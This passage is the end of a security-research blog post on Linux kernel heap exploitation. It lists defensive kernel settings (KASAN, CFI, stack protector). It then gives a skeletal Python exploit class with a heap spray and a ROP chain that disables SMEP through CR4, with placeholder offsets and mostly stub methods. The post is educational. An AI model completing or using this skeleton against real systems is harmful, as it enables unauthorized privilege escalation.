</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 3. Race to reallocate freed memory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 4. Control function pointer call
</span></span></span></code></pre></div><h2 id="detection-and-defense">Detection and Defense</h2>
<h3 id="1-kasan-kernel-address-sanitizer">1. KASAN (Kernel Address Sanitizer)</h3>
<p>Enable KASAN for development/testing:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Kernel config</span>
</span></span><span style="display:flex;"><span>CONFIG_KASAN<span style="color:#f92672">=</span>y
</span></span><span style="display:flex;"><span>CONFIG_KASAN_INLINE<span style="color:#f92672">=</span>y
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Boot parameter</span>
</span></span><span style="display:flex;"><span>kasan<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span></code></pre></div><h3 id="2-control-flow-integrity">2. Control Flow Integrity</h3>
<p>Modern kernels support CFI:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Kernel config</span>
</span></span><span style="display:flex;"><span>CONFIG_CFI_CLANG<span style="color:#f92672">=</span>y
</span></span><span style="display:flex;"><span>CONFIG_CFI_PERMISSIVE<span style="color:#f92672">=</span>n
</span></span></code></pre></div><h3 id="3-stack-canaries">3. Stack Canaries</h3>
<p>Kernel stack protection:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>CONFIG_STACKPROTECTOR<span style="color:#f92672">=</span>y
</span></span><span style="display:flex;"><span>CONFIG_STACKPROTECTOR_STRONG<span style="color:#f92672">=</span>y
</span></span></code></pre></div><h2 id="practical-exploitation-framework">Practical Exploitation Framework</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">KernelExploit</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>kernel_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>physmap_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffff888000000000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_kernel_base</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Implementation for KASLR bypass</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">spray_heap</span>(self, size, count<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Heap spray implementation</span>
</span></span><span style="display:flex;"><span>        objects <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(count):
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Use appropriate syscall for allocation</span>
</span></span><span style="display:flex;"><span>            obj <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>allocate_object(size)
</span></span><span style="display:flex;"><span>            objects<span style="color:#f92672">.</span>append(obj)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> objects
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build_rop_chain</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Build ROP chain for privilege escalation</span>
</span></span><span style="display:flex;"><span>        rop <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x12345</span>,  <span style="color:#75715e"># pop rdi; ret</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x406f0</span>,                     <span style="color:#75715e"># CR4 without SMEP</span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x67890</span>,  <span style="color:#75715e"># mov cr4, rdi; ret</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># ... continue chain</span>
</span></span><span style="display:flex;"><span>        ]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> rop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trigger_vulnerability</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Trigger specific vulnerability</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">escalate_privileges</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Overwrite current-&gt;cred</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Modern Linux kernel heap exploitation requires deep understanding of:</p>
<ol>
<li>SLUB allocator internals and metadata layout</li>
<li>Current mitigation techniques and their weaknesses</li>
<li>Advanced bypass methods for KASLR, SMEP/SMAP, and other protections</li>
<li>Reliable exploitation primitives like msg_msg and seq_operations</li>
</ol>
<p>As mitigations continue to evolve, exploitation techniques must adapt accordingly. The cat-and-mouse game between attackers and defenders drives innovation in both offensive and defensive security research.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="http://phrack.org/issues/64/6.html">Linux Kernel Exploitation (Phrack 64)</a></li>
<li><a href="https://events.static.linuxfound.org/sites/events/files/slides/slaballocators.pdf">SLUB: The Unqueued Slab Allocator</a></li>
<li><a href="https://keenlab.tencent.com/en/whitepapers/Kernel_Exploits_Examples_and_Prevention.pdf">Kernel Exploits: Examples and Prevention</a></li>
</ul>
<hr>
<p><em>This research is conducted for educational purposes and responsible disclosure. Always practice ethical security research.</em></p>

        </div>

        
        <footer class="post-footer">
            <div class="post-tags">
                <h4>Tags</h4>
                <div class="tag-list">
                    
                    <span class="tag">#kernel-exploitation</span>
                    
                    <span class="tag">#linux</span>
                    
                    <span class="tag">#heap</span>
                    
                    <span class="tag">#kmalloc</span>
                    
                    <span class="tag">#slab</span>
                    
                </div>
            </div>
        </footer>
        
    </article>
</div>

        </main>

        <footer class="site-footer">
    <div class="footer-content">
        <div class="footer-section">
            <h3>gracecondition</h3>
            <p>OS internals, binary exploitation, and low-level security research</p>
        </div>

        <div class="footer-section">
            <h4>Quick Links</h4>
            <ul>
                <li><a href="/posts/">Posts</a></li>
                <li><a href="/articles/">Articles</a></li>
                <li><a href="/ctf/">CTF Solutions</a></li>
                <li><a href="/about/">About</a></li>
            </ul>
        </div>

        <div class="footer-section">
            <h4>Connect</h4>
            <div class="social-links">
                
                
                
            </div>
        </div>
    </div>

    <div class="footer-bottom">
        <p>&copy; 2025 gracecondition. All rights reserved.</p>
    </div>
</footer>
    </div>

    <script src="http://localhost:1313/js/main.js"></script>
    
</body>
</html>
